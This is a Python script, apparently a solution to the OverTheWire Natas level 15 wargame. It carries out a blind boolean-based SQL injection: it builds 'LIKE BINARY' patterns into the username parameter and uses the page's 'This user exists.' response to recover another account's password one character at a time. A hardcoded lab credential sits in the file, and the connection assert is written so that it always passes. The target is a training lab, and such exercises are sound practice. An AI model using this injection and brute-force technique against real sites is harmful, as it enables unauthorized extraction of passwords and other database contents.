# coding=utf-8
import base64
import requests
from bs4 import BeautifulSoup

USERNAME = 'natas15:'.encode()
PASSWORD = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'.encode()
URL = 'http://natas15.natas.labs.overthewire.org'
CHARS = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
# The string that tells we're on the right path
EXISTSSTR = 'This user exists.'.encode()
NEXT_LEVEL_PASSWORD = ''


def connect():
    global headers
    base_encoded_auth = base64.b64encode(USERNAME + PASSWORD).decode('utf-8')
    print(base_encoded_auth)  # bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==
    headers = {'Authorization': 'Basic {0}'.format(base_encoded_auth)}
    response = requests.get(URL, headers=headers)
    assert (response.status_code != requests.codes.ok, "Can't connect")
    # import ipdb;ipdb.set_trace()
    # the_page_output = response.text
    # print(the_page_output)


def select_chars():
    parsed_chars = ''
    for char in CHARS:
        response = requests.get(URL + '?username=natas16" AND password LIKE BINARY "%' + char + '%" "', headers=headers)
        # print(response.text)
        html_response_parser = BeautifulSoup(response.content, 'html.parser')  # .get_text
        # ipdb.set_trace()
        # next required to read div content for some reason
        if EXISTSSTR in html_response_parser.find("div", {"id": "content"}).next.encode():
            parsed_chars += char
    print('Characters Used: ' + parsed_chars)
    print('Starting brute force...')
    return parsed_chars


def brute_force(selected_chars, next_level_password):
    # Assuming password is 32 characters long
    for i in range(32):
        for char in selected_chars:
            # SQL injection #2
            # print('hi')
            req = requests.get(
                URL + '?username=natas16" AND password LIKE BINARY "' + next_level_password + char + '%" "',
                headers=headers)
            html_response_parser2 = BeautifulSoup(req.content, 'html.parser')  # .get_text
            # Did we found the character at the i position of the password?
            # print('bye')
            if EXISTSSTR in html_response_parser2.find("div", {"id": "content"}).next.encode():
                next_level_password += char
                print('Password: ' + next_level_password + '*' * int(32 - len(next_level_password)))
                break


connect()
selected_chars = select_chars()
brute_force(selected_chars, NEXT_LEVEL_PASSWORD)
print('Done')
